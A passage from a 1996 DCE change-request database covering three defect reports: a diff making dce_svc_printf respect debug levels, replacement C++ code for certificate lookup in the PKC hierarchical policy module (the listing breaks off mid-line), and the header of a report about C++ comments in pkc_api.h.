error messages.  It's probably okay to hard code dce_sf_st_ok=0,
because this is consistent with other success codes (e.g. error_status_
ok).  However, the other errors should not be hard coded for
a number of reasons.  One is that these codes may be incompatible
with error message formats of some systems.



CR Number                     : 13677
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : svc
Short Description             : dce_svc_printf ignores debug levels
Reported Date                 : 12/3/96
Found in Baseline             : 1.1
Found Date                    : 12/3/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : svcprintf.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/3/96 public]

A customer reported that when dce_svc_printf() is called with one of 
the debug message level attributes the message was always printed 
even when the debug level exceeded the value set in the environment 
variable.  

The code for dce_svc_printf calls dce_svc__debug_fillin() to fill in the 
debug routing but ignores the debug levels found.  The following code
appears to fix the problem:

rcsdiff -c -r12.4 -r13.3 dce/utils/svc/svcprintf.c
===================================================================
RCS file: dce/utils/svc/RCS/svcprintf.c,v
retrieving revision 12.4
retrieving revision 13.3
diff -c -r12.4 -r13.3
*** 12.4        1995/08/10 20:42:37
--- 13.3        1996/12/03 19:12:43
***************
*** 523,528 ****
--- 527,535 ----
            /* It's a debug message; fill in debug values. */
            if (!handle->setup && !dce_svc__debug_fillin(handle, &st))
                goto Done;
+           /* Ignore this level? */
+           if (handle->table[table_index].sc_level <
+               (attributes & svc__c_debugmask)) goto Done;
            rp = handle->routes.routes;
            i = handle->routes.nroutes;
        }



CR Number                     : 13676
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pkc
Short Description             : Some certs not found
Reported Date                 : 12/3/96
Found in Baseline             : 1.2.2b5
Found Date                    : 12/3/96
Severity                      : C
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/security/pkc/capi/plcy/pkc_plcy_hierarchy.cxx
Diff supplied by              : provider
Diff release                  : 1.2.2b5
Sensitivity                   : public

[12/3/96 public]

The Certification API's hierarchical policy module may not find all 
certificates needed for a certification path.  The hierarchical policy
is supposed to find CA certificates stored under either their subject 
or their issuer.  Currently, when traversing the up portion of a
certification path, the policy module will only find certificates stored
under the issuer; on the down path, only certificates stored under the
subject will be found.

Until a code fix can be provided, a work-around is to store up-certificates 
in the directory entry of the certificate issuer, and down-certificates in 
the directory entry of the certificate subject.

[12/23/96 public]

Here is the fix for this problem.  This fix will allow the hierarchical
policy module to find CA certificates stored in either the CACert or
CrossCertPair attributes of the directory entries of either the
certificate subject or the issuer.

To address the bug in this OT, you need to make changes to module
src/security/pkc/capi/plcy/pkc_plcy_hierarchy.cxx (since the drop in
R1.2.2_bl5). The changes to pkc_plcy_hierarchy.cxx are as follows:


1. Two #defines have been added.
2. Prototypes for 2 functions (process_ca_user_certs, & process_cross_certs)
   have been changed to include an extra integer parameter.
3. The code for three functions  (process_ca_user_certs,process_cross_certs & 
   add_certs_in_entry) has been changed. The prototype for add_certs_in_entry
   has not been changed.


Instead of providing traditional diff's, it is simpler to provide the
entire code for the three functions & their prototypes. 

Perform the following steps:

STEP I:

Add the following lines (anywhere) before the start of the function prototypes. 

#define FIRST_TIME 0
#define SECOND_TIME 1


STEP 2:

Replace the function prototypes for process_ca_user_certs & process_cross_certs
with the ones below:

unsigned32 process_ca_user_certs(pkc_trust_list_t *partial, 
			 x500name  & ca, 
                         int is_ca,
			 x500name &ca_cert_dir,
			 direction flag,
			 int depth,
                         struct ca_db_entry **cainfo_p,
                         int step_number);

unsigned32 process_cross_certs(pkc_trust_list_t *partial, 
			 x500name  & ca, 
                         int is_ca,
			 x500name &ca_cert_dir,
			 direction flag,
			 int depth,
                         struct ca_db_entry **cainfo_p,
                         int step_number);


STEP 3:

Replace the entire code for functions add_certs_in_entry,
process_ca_user_certs, and process_cross_certs, with the code 
fragments shown below.  Functions are separated by a comment line
of the form /* ************************************************** */


static void add_certs_in_entry (pkc_trust_list_t *partial, 
			 x500name  & ca, 
                         int is_ca,   /* 1 if ca, 0 if user */
			 x500name  & ca_cert_dir, 
			 direction flag,
			 int depth,
                         struct ca_db_entry **cainfo_p,
			 unsigned32 *status)
{


  unsigned32 status1;



  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug9,
        ">add_certs_in_entry"));

  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
        ">add_certs_in_entry: ca = %s",convert_x500name_to_printable_form(ca)));
  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
        ">add_certs_in_entry: ca_cert_dir = %s",convert_x500name_to_printable_form(ca_cert_dir)));
  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
        ">add_certs_in_entry: is_ca = %ld, direction = %ld, & depth = %ld",
         is_ca, flag, depth));



  switch (flag) {

   // ************************************************
   // **************  UP ****************************
   // ************************************************
  case up:
    // first, read the ca_revoke list, and for each of the certificates listed,
    // call the appropriate pkc_certs api to remove any certificates that have
    // been revoked.

    *status = revoke_certs_if_any (ca_cert_dir, is_ca, partial);
    if (*status != 0) {

      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: revoke_certs_if_any failed %ld",*status));

      return;
    }

    // mbg: for now, we process both user revocation as well as 
    // ca revocation list regardless of whether we were called
    // for the target or an intermediate ca.
    *status = revoke_certs_if_any (ca_cert_dir, !is_ca, partial);
    if (*status != 0) {

      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: revoke_certs_if_any failed %ld",*status));

      return;
    }

    // process the certs in CA_CERT_OID. While establishing
    // trustbase, we only process certs in CA_CERT_OID &
    // don't process certs in USER_CERT_OID

    // mbg: 12/13/96: we found a bug in the current implementation
    // in R1.2.2bl6. The problem was that while going up, we were
    // honoring only "up" certs in an entry 
    // for which the issuer was the entry itself. This 
    // is not right.. We need to honor "up" certs where the subject is 
    // the entry being looked up as well. 
    // IN order to do this correctly, we need to process "up" certs
    // stored in entry for which the entry is a subject
    //  before processing "up" certs stored in entry for which it is a issuer.
    // We thus call process_ca_user_certs twice: First time to 
    // to process up certs in which entry is subject, and second time
    // to process up certs where entry is issuer.
    // The order is important (i.e. process "up" certs for which entry is
    // subject before processing "up" certs for which entry is issuer)
    // since it may otherwise result in missing on some valid public
    // keys. 
    // To distinguish these two steps, we add yet another paramter
    // to process_ca_user_certs and process_cross_certs. The constants
    // FIRST_TIME and SECOND_TIME are used to distinguish the two steps
    // in the code. 

    *status = process_ca_user_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, FIRST_TIME);
    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: process_ca_user_certs failed %ld",*status));
      return;
    }


  // second, read the certificates in the cross_cert_oid attr.
    *status = process_cross_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, FIRST_TIME);

    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: process_cross_certs failed %ld",*status));
      return;
    }



    *status = process_ca_user_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, SECOND_TIME);
    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: process_ca_user_certs failed %ld",*status));
      return;
    }


  // second, read the certificates in the cross_cert_oid attr.
    *status = process_cross_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, SECOND_TIME);

    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: process_cross_certs failed %ld",*status));
      return;
    }

   break;

   // ************************************************
   // **************  DOWN ****************************
   // ************************************************
   case down: 

   // we need to do the downward processing in two steps
   // as well. In the first step, we process down ca-certs & user certs
   // whose subject is the current entry; in the second step
   // we process down ca-certs & user-certs whose issuer is the
   // current entry.


    // while going down, we need to process both ca_cert_oid
   // and user_cert_oid if is_ca == user.
    *status = process_ca_user_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, FIRST_TIME);
    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: process_ca_user_certs failed %ld",*status));
      return;
    }

    if (!is_ca) {  /* if ca was a user, process ca_cert_oid as well */
                   /* since for users, we need to do both */
     *status = process_ca_user_certs(partial, 
			 ca, 
                         !is_ca,
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, FIRST_TIME);
      if (*status != 0) {
        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
              "add_certs_in_entry: process_ca_user_certs failed %ld",*status));
        return;
      }
    }

  // second, read the certificates in the cross_cert_oid attr.
    *status = process_cross_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, FIRST_TIME);

    if (*status != 0) {
        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
              "add_certs_in_entry: process_cross_certs failed %ld",*status));
      return;
    }

    // certs in db are definitely those s.t. entry is a subject in certs
    // thus we need to do it only once.
    *status = process_cross_certs_in_db(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			 flag,
			 depth,
                         cainfo_p);

    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
              "add_certs_in_entry: process_cross_certs_in_db failed %ld",*status));
      return;
    }



    // while going down, we need to process both ca_cert_oid
   // and user_cert_oid if is_ca == user.
    *status = process_ca_user_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, SECOND_TIME);
    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: process_ca_user_certs failed %ld",*status));
      return;
    }

    if (!is_ca) {  /* if ca was a user, process ca_cert_oid as well */
                   /* since for users, we need to do both */
     *status = process_ca_user_certs(partial, 
			 ca, 
                         !is_ca,
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, SECOND_TIME);
      if (*status != 0) {
        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
              "add_certs_in_entry: process_ca_user_certs failed %ld",*status));
        return;
      }
    }

  // second, read the certificates in the cross_cert_oid attr.
    *status = process_cross_certs(partial, 
			 ca, 
                         is_ca,   /* 1 if ca, 0 if user */
			  ca_cert_dir, 
			 flag,
			 depth,
                         cainfo_p, SECOND_TIME);

    if (*status != 0) {
        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
              "add_certs_in_entry: process_cross_certs failed %ld",*status));
      return;
    }



    *status = revoke_certs_if_any (ca_cert_dir, is_ca, partial);
    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
              "add_certs_in_entry: revoke_certs_if_any failed %ld",*status));
      return;
    }



    // mbg: for now, we process both user revocation as well as 
    // ca revocation list regardless of whether we were called
    // for the target or an intermediate ca.
    *status = revoke_certs_if_any (ca_cert_dir, !is_ca, partial);
    if (*status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
            "add_certs_in_entry: revoke_certs_if_any failed %ld",*status));
      return;
    }





    break;


    default:
     DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
           "add_certs_in_entry: direction is neither up or down, serious error"));
     return;
    }       /* end of switch */

  
 *status = 0;
 DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug9,
       ">add_certs_in_entry"));
  return ;


}  /* add_certs_in_entry */

/* ************************************************** */

unsigned32 process_ca_user_certs(pkc_trust_list_t *partial, 
			 x500name  & ca, 
                         int is_ca,
			 x500name &ca_cert_dir,
			 direction flag,
			 int depth,
                         struct ca_db_entry **cainfo_p,
                         int step_count)
{
  unsigned32 status, status1;
  x500name cert_issuer, cert_subject;
  int  is_ancestor,  is_descendant, is_equal, 
     is_sibling, depth_difference;
  Certificate cert;
  const xds_attribute_t *attr_result = 0;
  xds_read_result_t *result = 0;
  unsigned char *asn1_cert_p = 0; size_t length = 0;
  const xds_value_t *value_result = 0;

  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug9,
    ">process_ca_user_certs"));

  // first, read the x500 certificate attribute values 
  // there should only be one attribute, with possibly multiple values returned
  // where the attribute identifies this to be a certificate attribute, and the
  // individual values correspond to the one or more certificates.
  result = read_xds_certificate_attribute(ca_cert_dir, is_ca, &status);
  if (status != 0) {
    return 0; 
  }

  status = result->get_first_attribute(attr_result); // we only have one attribute.
  if (status != 0 || attr_result == 0) {
    delete result;
    return 0;
  }

  status = attr_result->get_first_value(value_result); //get the first value
  if (status != 0 || value_result == 0) {
    delete result;
    return 0; 
  }


  status = value_result->get_value(asn1_cert_p, length);  // get the asn1 encoding in value
  if (status != 0 || length == 0 || asn1_cert_p == 0) {
    DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
      "process_ca_user_certs get value failed %ld", status));
    delete result;
    return 0;  // actually a problem, in that, there is value, but zero bytes in value.
  }
  

  while (1) {

    status = construct_certificate(asn1_cert_p,length, cert);
    if (status != 0)  { // problem creating certificate
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
        "process_ca_user_certs construct_certificate failed %ld", status));
      status = 0;
      goto next_cert;
    }
    cert_issuer = cert.certificateInfo.issuer;
    cert_subject = cert.certificateInfo.subject;

    status = determine_relation(cert_issuer, cert_subject, is_ancestor,
                          is_descendant, is_equal,
                          is_sibling, depth_difference);
    if (status != 0) {
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
        "process_ca_user_certs determine_relation failed %ld", status));
     if (asn1_cert_p)  
       pkc_free (asn1_cert_p);
     delete result;
     return status;
    }

    // check if ca is present in the required depth in the list of ca's so far..
    // if not, skip adding this certificate.

    // this is slightly more complicated.. If direction is up, then
    // we are willing to tolerate certs that are issued by cert_issuer who
    // is a child of ca, and within depth.
    //
    // if direction is down, we are willing to tolerate certs issued by
    // cert_issuer who is an ancestor of ca, and within depth. however,
    // in this case, we are also willing to tolerate certs that are
    // issued by cert_issuer who is a cross-link of ca. This is because,
    // to complete trust chain while coming down, we are allowed to take
    // one cross link.

    switch (flag) {

    // ******************************************************
    // ******************** UP *****************************
    // *****************************************************
    case up:

     if ((ca == cert_subject) && (step_count == FIRST_TIME)) {
       // process this certificate
       // we only process  UP certificates and cross certificates. 
      // first check for up certificate, and whether ca == cert_subject
      // these are processed during first step while traveling up..
      if (is_descendant && (depth_difference <= depth)) {

	status1  = pkc_check_cert_against_trustlist (partial, 
                  &cert, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_ca_user_certs pkc_check_cert_against_trustlist returned %ld", status1));


      }

 
    }  /* if ca == cert_subject && step_count == FIRST_TIME  */

     if ((ca == cert_issuer) && (step_count == SECOND_TIME)) {
       // process this certificate
       // we only process  UP certificates and cross certificates. 
      // first check for up certificate and make sure the entry
      // being looked up is the issuer itself.
      if (is_descendant && (depth_difference <= depth)) {

	status1  = pkc_check_cert_against_trustlist (partial, 
                  &cert, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_ca_user_certs pkc_check_cert_against_trustlist returned %ld", status1));


      }

      // even though this is not exactly good, we still
      // allow for a cross-cert to be in a ca-cert oid..
      if (is_sibling)  {  /* cross certificate */
	unsigned char *princ = 0;        
	status = convert_x500name_to_string(cert_subject, princ);
        if (status != 0) {
          if (asn1_cert_p)  
            pkc_free (asn1_cert_p);
          delete result;
          return status;
       }
       status = add_ca_and_cert_to_crdb((char *)princ, asn1_cert_p, length, cainfo_p);
       if (status != 0) {
          if (asn1_cert_p)  
            pkc_free (asn1_cert_p);
          delete result;
          return status;
       }
       pkc_free (princ);
    }


   }  /* if ca == cert_issuer && step_count == SECOND_TIME */

   break;

    // ******************************************************
    // ******************** DOWN *****************************
    // *****************************************************

    case down:


     if ((ca == cert_subject) && (step_count == FIRST_TIME)) {
       // process this certificate
       // we only process  DOWN certificates and cross certificates. 
      // in both cases, we try to add the certificate
      if ((is_ancestor && (depth_difference <= depth)) ||
           (is_sibling)) {

	status1  = pkc_check_cert_against_trustlist (partial,
                       &cert, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_ca_user_certs pkc_check_cert_against_trustlist returned %ld", status1));

      }

     }  /* if ca == cert_subject && step_count == FIRST_TIME */

     if ((ca == cert_issuer) && (step_count == SECOND_TIME)) {
      if (is_ancestor && (depth_difference <= depth)) {
	status1  = pkc_check_cert_against_trustlist (partial,
                       &cert, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_ca_user_certs pkc_check_cert_against_trustlist returned %ld", status1));

      }
     } /* if ca == cert_issuer && step_count == SECOND_TIME */
     


   break;

   default:  /* should never come here */
      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
        "process_ca_user_certs pkc_check_cert_against_trustlist ** ERROR **"));
   delete result;
   return (-1);
  } /* end of switch statement */




next_cert:
    if (asn1_cert_p)  
       pkc_free (asn1_cert_p);


    asn1_cert_p = 0;
    length = 0;

    status = attr_result->get_next_value(value_result); //get the next value value
    if (status != 0 || value_result == 0) {   // end of certificates..
      // should check for value and make sure it indicates last value.. but for now, this is ok.
      // this is really a normal return from this procedure.

      delete result;
      return 0;
    }

    status = value_result->get_value(asn1_cert_p, length);  // get the asn1 encoding in value
    if (status != 0 || length == 0 || asn1_cert_p == 0) {
      delete result;
      return 0;
    }

  } /* while (1) */

  /* should never come here */
   DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
     "process_ca_user_certs pkc_check_cert_against_trustlist ** ERROR **"));
  return (-1);
}  /* end of process_ca_user_certs */

/* ************************************************** */

unsigned32 process_cross_certs(pkc_trust_list_t *partial, 
			 x500name  & ca, 
                         int is_ca,
			 x500name &ca_cert_dir,
			 direction flag,
			 int depth,
                         struct ca_db_entry **cainfo_p,
                         int step_count)
{
  unsigned32 status, status1, status2;
  Certificate cert1, cert2;
  const xds_attribute_t *attr_result = 0;
  xds_read_result_t *result = 0;
  const xds_value_t *value_result = 0;

  unsigned char *asn1_cert1_p = 0, *asn1_cert2_p = 0;
  unsigned char  *asn1_cross_cert_p = 0;
  size_t length = 0, asn1_length = 0, asn2_length = 0;
  int cert1_present, cert2_present;
  x500name cert1_issuer, cert1_subject, cert2_issuer, cert2_subject;
  int cert1_is_ancestor,  cert1_is_descendant, cert1_is_equal,
      cert1_is_sibling, cert1_depth_difference,
     cert2_is_ancestor,  cert2_is_descendant, cert2_is_equal,
      cert2_is_sibling, cert2_depth_difference;

  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug9,
    ">process_cross_certs"));

  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
    ">process_cross_certs ca = %s", convert_x500name_to_printable_form(ca)));
  DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
    ">process_cross_certs ca_cert_dir = %s", convert_x500name_to_printable_form(ca_cert_dir)));

  // first, read the x500 certificate attribute values 
  // there should only be one attribute, with possibly multiple values returned
  // where the attribute identifies this to be a certificate attribute, and the
  // individual values correspond to the one or more cross-certificates.

  // even though, strictly speaking, both for ca and user, cross cert oid
  // is same, we have made provision for read_xds_cross_cert.. to 
  // to take in is_ca, just in case we find that the standard specifes
  // otherwise.
  result = read_xds_cross_certificate_attribute(ca_cert_dir, is_ca, &status);
  if (status != 0 || result == 0) {
    return 0; 
  }

  status = result->get_first_attribute(attr_result); // we only have one attribute.
  if (status != 0 || attr_result == 0) {
    delete result;
    return 0;
  }

  status = attr_result->get_first_value(value_result); //get the first value
  if (status != 0 || value_result == 0) {
    delete result;
    return 0; 
  }


  status = value_result->get_value(asn1_cross_cert_p, length);  // get the asn1 encoding in value
  if (status != 0 || length == 0 || asn1_cross_cert_p == 0) {
    DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
      "process_cross_certs get_value failed %ld", status));
    delete result;
    return 0;  // actually a problem, in that, there is value, but zero bytes in value.
  }
  

  while (1) {



    status = construct_cross_certificate(asn1_cross_cert_p,length,
				  cert1_present, 
                                 &asn1_cert1_p, asn1_length, 
                                cert1, 
                                cert2_present,
                                 &asn1_cert2_p, asn2_length,
                               cert2);

    if (status != 0)  { // problem creating certificate

      DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
        "process_cross_certs construct_cross_certificate failed %ld", status));

      goto next_cross_cert;
    }

    if (cert1_present) {    
        cert1_subject = cert1.certificateInfo.subject;
        cert1_issuer = cert1.certificateInfo.issuer;
        status = determine_relation(cert1_issuer, cert1_subject, cert1_is_ancestor,
                                cert1_is_descendant, cert1_is_equal,
                               cert1_is_sibling, cert1_depth_difference);
        if (status != 0) {
          if (asn1_cross_cert_p)  
             pkc_free (asn1_cross_cert_p);
          if (asn1_cert1_p)  
             pkc_free (asn1_cert1_p);
          if (asn1_cert2_p)  
             pkc_free (asn1_cert2_p);
         delete result;
         return status;
        }
    }

    if (cert2_present) {    
        cert2_subject = cert2.certificateInfo.subject;
        cert2_issuer = cert2.certificateInfo.issuer;

        status = determine_relation(cert2_issuer, cert2_subject, cert2_is_ancestor,
                                cert2_is_descendant, cert2_is_equal,
                               cert2_is_sibling, cert2_depth_difference);
        if (status != 0) {
          if (asn1_cross_cert_p)  
             pkc_free (asn1_cross_cert_p);
          if (asn1_cert1_p)  
             pkc_free (asn1_cert1_p);
          if (asn1_cert2_p)  
             pkc_free (asn1_cert2_p);
          delete result;
          return status;
        }
    }



    switch (flag) {

    // ***************************************************
    // ********************* UP **************************
    // ***************************************************

    case up:


      // first check if the certificate can be added to the cross
      // cert database of the subject. 
      // for this to work, we tolerate a cross certificate only if
      // issuer == ca, & issuer is a sibling of subject && 
      // step_count == FIRST_TIME.
      // any other type of cross cert is ignored. If the check 
      // passes, we add this cross cert in the subject's cross-cert
      // database entry.

     if ((cert1_present) &&
         (ca == cert1_issuer) &&
         (cert1_is_sibling) && (step_count == FIRST_TIME)) {
        	unsigned char *princ = 0;        
	        status = convert_x500name_to_string(cert1_subject, princ);
               if (status != 0) {
                 if (asn1_cross_cert_p)  
                    pkc_free (asn1_cross_cert_p);
                 if (asn1_cert1_p)  
                    pkc_free (asn1_cert1_p);
                 if (asn1_cert2_p)  
                    pkc_free (asn1_cert2_p);
                  delete result;
                  return status;
               }
               status = add_ca_and_cert_to_crdb((char *)princ, asn1_cert1_p, asn1_length, cainfo_p);
              if (status != 0) {
                if (asn1_cross_cert_p)  
                  pkc_free (asn1_cross_cert_p);
                if (asn1_cert1_p)  
                  pkc_free (asn1_cert1_p);
                if (asn1_cert2_p)  
                  pkc_free (asn1_cert2_p);
                delete result;
                return status;
              }
              pkc_free (princ);
     }  /* cross cert whose subject is a sibling and issuer==ca */

     if ((cert2_present) &&
         (ca == cert2_issuer) &&
         (cert2_is_sibling) && (step_count == FIRST_TIME)) {

        	unsigned char *princ = 0;        
	        status = convert_x500name_to_string(cert2_subject, princ);
               if (status != 0) {
                  if (asn1_cross_cert_p)  
                    pkc_free (asn1_cross_cert_p);
                  if (asn1_cert1_p)  
                    pkc_free (asn1_cert1_p);
                  if (asn1_cert2_p)  
                    pkc_free (asn1_cert2_p);
                  delete result;
                  return status;
               }
               status = add_ca_and_cert_to_crdb((char *)princ, asn1_cert2_p, asn2_length, cainfo_p);
              if (status != 0) {
                if (asn1_cross_cert_p)  
                  pkc_free (asn1_cross_cert_p);
                if (asn1_cert1_p)  
                  pkc_free (asn1_cert1_p);
                if (asn1_cert2_p)  
                  pkc_free (asn1_cert2_p);
                delete result;
                return status;
              }
              pkc_free (princ);
     }  /* cross cert whose subject is a sibling and issuer==ca */

      // the same way we tolerate cross-certs in ca-cert-oid's,
      // we also tolerate ca-cert's in cross-cert-oids.
      // so now, we check whether either of the cross certs are
      // up certs. If so, we need to process them in two steps
      // similar to the up certs.. Note that we don't store
      // these in cross-cert database, as that is just a database
      // for certs whose  subjects  may be looked up during downward
      // traversal.
    
     if ((cert1_present) &&
         (ca == cert1_subject) && (cert1_is_descendant) && 
         (cert1_depth_difference <=  depth) &&  (step_count == FIRST_TIME)) {
           status1 = pkc_check_cert_against_trustlist(partial, &cert1, 1);
             DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
               "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status1));
     }

     if ((cert2_present) &&
         (ca == cert2_subject) && (cert2_is_descendant) && 
         (cert2_depth_difference <=  depth) && (step_count == FIRST_TIME)) {
           status1 = pkc_check_cert_against_trustlist(partial, &cert2, 1);
             DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
               "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status1));
     }

     if ((cert1_present) &&
         (ca == cert1_issuer) && (cert1_is_descendant) && 
         (cert1_depth_difference <=  depth) && (step_count == SECOND_TIME)) {
           status1 = pkc_check_cert_against_trustlist(partial, &cert1, 1);
             DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
               "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status1));
     }

     if ((cert2_present) &&
         (ca == cert2_issuer) && (cert2_is_descendant) && 
         (cert2_depth_difference <=  depth) && (step_count == SECOND_TIME)) {
           status1 = pkc_check_cert_against_trustlist(partial, &cert2, 1);
             DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
               "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status1));
     }

   break;

    // *****************************************************
    // ******************  DOWN  ********************************
    // *****************************************************
    case down:

      // check validity of cross cert and location before
     // trying to add the certificate
   
      // the same way we tolerate cross-certs in ca-cert-oid's,
      // we also tolerate ca-cert's in cross-cert-oids.
      // so now, we check whether either of the cross certs are
      // down certs. If so, we need to process them in two steps
      // similar to the up certs.. 

    if (cert1_present && 
         (cert1_is_sibling || (cert1_is_ancestor &&
                               (cert1_depth_difference <= depth))) &&
        (cert1_subject == ca) && (step_count == FIRST_TIME)) {


	status1  = pkc_check_cert_against_trustlist (partial, &cert1, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status1));

      }

    if (cert2_present && 
        (cert2_is_sibling || (cert2_is_ancestor &&
                (cert2_depth_difference <=  depth))) &&
        (cert2_subject == ca) && (step_count == FIRST_TIME)) {


	status2  = pkc_check_cert_against_trustlist (partial,  &cert2, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status2));


      }

    // now, steps for second time... Since we now proecss certs
    // fow which the entry is the issuer, we don't need to check
    // for sibling relationshiops.. We just check if this is a misplaced
    // down certificate and honor it if all other checks pass..
    if (cert1_present && 
         cert1_is_ancestor && (cert1_depth_difference <= depth) &&
        (cert1_issuer == ca) && (step_count == SECOND_TIME)) {


	status1  = pkc_check_cert_against_trustlist (partial, &cert1, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status1));

      }

    if (cert2_present && 
        cert2_is_ancestor && (cert2_depth_difference <=  depth) &&
        (cert2_issuer == ca) && (step_count == SECOND_TIME)) {


	status2  = pkc_check_cert_against_trustlist (partial,  &cert2, 1);

        DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug4,
          "process_cross_certs pkc_check_cert_against_trustlist failed %ld", status2));


      }
    
    

   break;

   default:  /* should never come here */
     DCE_SVC_DEBUG((pkc__svc_handle, pkc_s_plcy, svc_c_debug1,
       "process_cross_certs  ** ERROR **"));
   return (-1);
  } /* end of switch statement */





next_cross_cert:
    if (asn1_cross_cert_p)  
       pkc_free (asn1_cross_cert_p);
    if (asn1_cert1_p)  
       pkc_free (asn1_cert1_p);
    if (as

CR Number                     : 13675
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pkc
Short Description             : pkc_api.h has C++ comments
